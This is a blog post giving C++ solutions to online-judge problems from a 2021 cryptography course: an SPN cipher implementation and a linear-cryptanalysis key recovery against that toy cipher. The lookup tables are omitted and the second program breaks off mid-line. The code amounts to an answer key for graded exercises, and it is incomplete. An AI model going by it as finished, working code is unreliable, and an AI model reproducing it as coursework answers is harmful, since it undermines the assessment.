    <title>密码学课设</title>
    <url>/2021/10/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E8%AE%BE/</url>
    <content><![CDATA[<hr>
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>$OJ\;$地址为：<a href="http://10.12.162.1:5880/contest/20/problems">oj | 2021年密码学课程设计</a></p>
</div>
<hr>
<h4 id="SPN实现"><a href="#SPN实现" class="headerlink" title="SPN实现"></a>SPN实现</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/I">oj | SPN实现</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030100423.png" alt="SPN实现"></p>
<p>注意打表文件太大，就不贴出来了，自行打表。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> SBox[<span class="number">16</span>] = &#123; <span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> PBox[<span class="number">16</span>] = &#123; <span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> SBox_inverse[<span class="number">16</span>] = &#123; <span class="number">14</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> PBox_inverse[<span class="number">16</span>] = &#123; <span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> c=(a&gt;&gt;(<span class="number">4</span>*(<span class="number">4</span>-i)))&amp;<span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">if</span>(c&gt;=<span class="number">0</span>&amp;&amp;c&lt;=<span class="number">9</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>+c);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c&gt;=<span class="number">10</span>&amp;&amp;c&lt;=<span class="number">15</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>+c<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    ch = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (ch != <span class="string">&#x27; &#x27;</span> &amp;&amp; ch != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x *= <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            x += ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            x += ch - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">DecToHex</span><span class="params">(<span class="keyword">int</span> dec)</span>        <span class="comment">//十进制转十六进制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">16</span>] = &#123; <span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> point = dec / <span class="number">0x1000</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x1000</span>;</span><br><span class="line">    point = dec / <span class="number">0x100</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x100</span>;</span><br><span class="line">    point = dec / <span class="number">0x10</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x10</span>;</span><br><span class="line">    str = str + hex[dec];</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S_Change</span><span class="params">(<span class="keyword">int</span> dec)</span>					<span class="comment">//S盒置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0xf000</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x0f00</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x00f0</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x000f</span>;</span><br><span class="line">    back |= SBox[tool];</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">P_Change</span><span class="params">(<span class="keyword">int</span> dec)</span>						<span class="comment">//P盒置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(PBox[i] &gt;= i+<span class="number">1</span>)</span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox[i]))) &lt;&lt; (PBox[i] - i - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox[i]))) &gt;&gt; (<span class="number">1</span> - PBox[i] + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S_Change_inverse</span><span class="params">(<span class="keyword">int</span> dec)</span>				<span class="comment">//S盒逆置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0xf000</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x0f00</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x00f0</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x000f</span>;</span><br><span class="line">    back |= SBox_inverse[tool];</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">P_Change_inverse</span><span class="params">(<span class="keyword">int</span> dec)</span>						<span class="comment">//P盒逆置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (PBox[i] &gt;= i + <span class="number">1</span>)</span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox_inverse[i]))) &lt;&lt; (PBox_inverse[i] - i - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox_inverse[i]))) &gt;&gt; (<span class="number">1</span> - PBox_inverse[i] + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w[<span class="number">4</span>], K[<span class="number">5</span>], u[<span class="number">4</span>], v[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">int</span> Key;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> pppp[<span class="number">65536</span>] =&#123;打表&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        Key = <span class="built_in">read</span>();</span><br><span class="line">        w[<span class="number">0</span>] = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">        K[<span class="number">0</span>] = Key &gt;&gt; <span class="number">16</span>;                        <span class="comment">//生成密钥</span></span><br><span class="line">        K[<span class="number">1</span>] = (Key &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">2</span>] = (Key &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">3</span>] = (Key &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">4</span>] = Key &amp; <span class="number">0xffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)                <span class="comment">//加密</span></span><br><span class="line">        &#123;</span><br><span class="line">            u[j] = w[j] ^ K[j];</span><br><span class="line">            v[j] = <span class="built_in">S_Change</span>(u[j]);</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">3</span>)</span><br><span class="line">                w[j + <span class="number">1</span>] = pppp[v[j]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> x = v[<span class="number">3</span>] ^K[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        v[<span class="number">3</span>] = K[<span class="number">4</span>] ^ (x ^ <span class="number">1</span>);                    <span class="comment">//解密</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            u[j] = <span class="built_in">S_Change_inverse</span>(v[j]);</span><br><span class="line">            w[j] = u[j] ^ K[j];</span><br><span class="line">            <span class="keyword">if</span> (j &gt; <span class="number">0</span>)</span><br><span class="line">                v[j - <span class="number">1</span>] = pppp[w[j]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(x);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="built_in">print</span>(w[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/II">oj | 线性分析</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030102409.png" alt="线性分析"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> us unsigned int</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getc()                                                                 \</span></span><br><span class="line">  (_b1 == _b2      ? <span class="built_in">fread</span>(_b, <span class="number">1</span>, <span class="number">100000</span>, stdin), _b2 = _b + <span class="number">100000</span>,           \</span><br><span class="line">   *((_b1 = _b)++) : *(_b1++))</span><br><span class="line"><span class="keyword">char</span> _b[<span class="number">100000</span>], *_b1, *_b2;</span><br><span class="line"><span class="comment">// s代换器</span></span><br><span class="line">us substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>&#125;,</span><br><span class="line">    &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125;&#125;;</span><br><span class="line">us permutation[<span class="number">65536</span>] = &#123;打表&#125;;</span><br><span class="line"><span class="function">us <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> ciphertext)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//s盒的代换</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    plaintext ^= ((k &gt;&gt; (<span class="number">16</span> - <span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">    plaintext = substitution[<span class="number">0</span>][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    plaintext = permutation[plaintext];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//p盒的置换</span></span><br><span class="line">  plaintext ^= ((k &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">  plaintext = substitution[<span class="number">0</span>][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">  plaintext ^= (k &amp; <span class="number">0xffff</span>);</span><br><span class="line">  <span class="keyword">return</span> (plaintext == ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> us <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  us h = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> c = <span class="built_in">getc</span>();</span><br><span class="line">  <span class="keyword">while</span> (c != <span class="string">&#x27; &#x27;</span> &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">    h = h * <span class="number">16</span> + ((c &gt;= <span class="string">&#x27;a&#x27;</span>) ? (c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>) : (c - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">    c = <span class="built_in">getc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n, times, maxNum[<span class="number">2</span>];</span><br><span class="line">  pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; count1[<span class="number">256</span>], count2[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> plaintext[<span class="number">8000</span>], ciphertext[<span class="number">8000</span>], temp[<span class="number">4</span>], k[<span class="number">8</span>], lastKey2, key;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="built_in">getc</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    lastKey2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">fill</span>(count1, count1 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">-4000</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">      plaintext[j] = <span class="built_in">read</span>();</span><br><span class="line">      ciphertext[j] = <span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算第一条链，求出k[5]和k[7]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (k[<span class="number">5</span>] = <span class="number">0</span>; k[<span class="number">5</span>] &lt; <span class="number">16</span>; k[<span class="number">5</span>]++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k[<span class="number">7</span>] = <span class="number">0</span>; k[<span class="number">7</span>] &lt; <span class="number">16</span>; k[<span class="number">7</span>]++) &#123;</span><br><span class="line">          temp[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">          temp[<span class="number">3</span>] = ((ciphertext[j] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">          temp[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp[<span class="number">1</span>]];</span><br><span class="line">          temp[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp[<span class="number">3</span>]];</span><br><span class="line">          <span class="keyword">if</span> ((((plaintext[j] &amp; <span class="number">0x800</span>) &gt;&gt; <span class="number">11</span>) ^ ((plaintext[j] &amp; <span class="number">0x200</span>) &gt;&gt; <span class="number">9</span>) ^</span><br><span class="line">               ((plaintext[j] &amp; <span class="number">0x100</span>) &gt;&gt; <span class="number">8</span>) ^ (temp[<span class="number">1</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">               ((temp[<span class="number">1</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">3</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">               ((temp[<span class="number">3</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>)) == <span class="number">0</span>)</span><br><span class="line">            count1[k[<span class="number">5</span>] * <span class="number">16</span> + k[<span class="number">7</span>]].first++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 得到部分密钥</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">      count1[j].second = j;</span><br><span class="line">      count1[j].first = <span class="built_in">abs</span>(count1[j].first);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(count1, count1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      lastKey2 = k[<span class="number">5</span>];</span><br><span class="line">      k[<span class="number">5</span>] = count1[j].second / <span class="number">16</span>;</span><br><span class="line">      k[<span class="number">7</span>] = count1[j].second % <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 计算第二条链</span></span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">255</span> || lastKey2 != k[<span class="number">5</span>]) &#123;</span><br><span class="line">        <span class="built_in">fill</span>(count2, count2 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">-4000</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (k[<span class="number">4</span>] = <span class="number">0</span>; k[<span class="number">4</span>] &lt; <span class="number">16</span>; k[<span class="number">4</span>]++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k[<span class="number">6</span>] = <span class="number">0</span>; k[<span class="number">6</span>] &lt; <span class="number">16</span>; k[<span class="number">6</span>]++) &#123;</span><br><span class="line">              temp[<span class="number">0</span>] = ((ciphertext[j] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">              temp[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">              temp[<span class="number">2</span>] = ((ciphertext[j] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">              temp[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp[<span class="number">0</span>]];</span><br><span class="line">              temp[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp[<span class="number">1</span>]];</span><br><span class="line">              temp[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp[<span class="number">2</span>]];</span><br><span class="line">              <span class="keyword">if</span> ((((plaintext[j] &amp; <span class="number">0x800</span>) &gt;&gt; <span class="number">11</span>) ^</span><br><span class="line">                   ((plaintext[j] &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>) ^ ((temp[<span class="number">0</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^</span><br><span class="line">                   (temp[<span class="number">0</span>] &amp; <span class="number">0x1</span>) ^ ((temp[<span class="number">1</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">1</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">                   ((temp[<span class="number">2</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">2</span>] &amp; <span class="number">0x1</span>)) == <span class="number">0</span>)</span><br><span class="line">                count2[k[<span class="number">4</span>] * <span class="number">16</span> + k[<span class="number">6</span>]].first++;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">          count2[j].second = j;</span><br><span class="line">          count2[j].first = <span class="built_in">abs</span>(count2[j].first);</span><br><span class="line">        &#125;</span><br><span class="line">        maxNum[<span class="number">0</span>] = <span class="built_in">max_element</span>(count2, count2 + <span class="number">256</span>) - count2;</span><br><span class="line">        count2[maxNum[<span class="number">0</span>]].first = <span class="number">0</span>;</span><br><span class="line">        maxNum[<span class="number">1</span>] = (*<span class="built_in">max_element</span>(count2, count2 + <span class="number">256</span>)).second;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">1</span>; h++) &#123;</span><br><span class="line">        k[<span class="number">4</span>] = maxNum[h] / <span class="number">16</span>;</span><br><span class="line">        k[<span class="number">6</span>] = maxNum[h] % <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">for</span> (k[<span class="number">0</span>] = <span class="number">0</span>; k[<span class="number">0</span>] &lt; <span class="number">65535</span>; k[<span class="number">0</span>]++) &#123;</span><br><span class="line">          key = (k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) | (k[<span class="number">4</span>] &lt;&lt; <span class="number">12</span>) | (k[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (k[<span class="number">6</span>] &lt;&lt; <span class="number">4</span>) | k[<span class="number">7</span>];</span><br><span class="line">          <span class="keyword">for</span> (times = <span class="number">0</span>; times &lt; <span class="number">2</span>; times++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">SPN</span>(key, plaintext[times], ciphertext[times]))</span><br><span class="line">              <span 